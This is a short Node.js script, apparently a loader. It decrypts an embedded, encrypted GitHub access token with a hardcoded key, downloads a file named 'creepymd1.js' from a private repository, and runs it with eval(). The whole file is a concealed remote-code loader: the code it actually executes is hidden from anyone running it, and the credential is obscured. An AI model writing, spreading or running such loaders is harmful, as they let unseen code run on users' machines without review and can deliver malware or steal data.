const axios = require("axios");
const crypto = require("crypto");
const fs = require('fs');

const secretKey = "Nancy"; 
const encryptedToken = "b25a621671c7a1b820014d7b30c69a65fa2c96d02a2fb5a10af621d72b2552905d94b5bef46cf2ef6cc369855bee5bf7"; 

function decrypt(encryptedText) {
    const decipher = crypto.createDecipher("aes-256-cbc", secretKey);
    let decrypted = decipher.update(encryptedText, "hex", "utf8");
    decrypted += decipher.final("utf8");
    return decrypted;
}

const token = decrypt(encryptedToken); 

const repoOwner = "Daniel432-gift";
const repoName = "Nancy";
const filePath = "creepymd1.js";
const branch = "main";

async function fetchPrivateFile() {
    try {
        const url = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}?ref=${branch}`;
        const response = await axios.get(url, {
            headers: {
                Authorization: `Bearer ${token}`, 
                Accept: "application/vnd.github.v3.raw",
            },
        });

        eval(response.data); 
    } catch (error) {
        console.error("Error fetching file:", error.response ? error.response.data : error);
    }
}

fetchPrivateFile();
